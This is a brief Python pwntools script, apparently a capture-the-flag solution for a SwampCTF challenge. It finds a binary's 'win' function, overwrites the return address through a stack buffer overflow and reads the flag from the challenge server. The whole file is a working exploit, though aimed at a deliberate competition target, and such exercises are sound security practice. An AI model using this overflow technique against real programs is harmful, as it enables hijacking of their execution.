#!/usr/bin/env python

from pwn import *

elf = ELF('./binary')
win_addr = elf.symbols['win']
# print(type(win_addr))
# print(p64(win_addr))
print(f'win_addr: {hex(win_addr)}')

# 0xA is v4, 0x8 is rbp
offset = 0xA + 0x8

io = remote('chals.swampctf.com', 40001)

payload = b'A' * offset + p64(win_addr)

io.sendline(payload)

io.recvuntil(b'Here is your flag! ')
flag = io.recvline()

print(f'flag: {flag.decode()}')
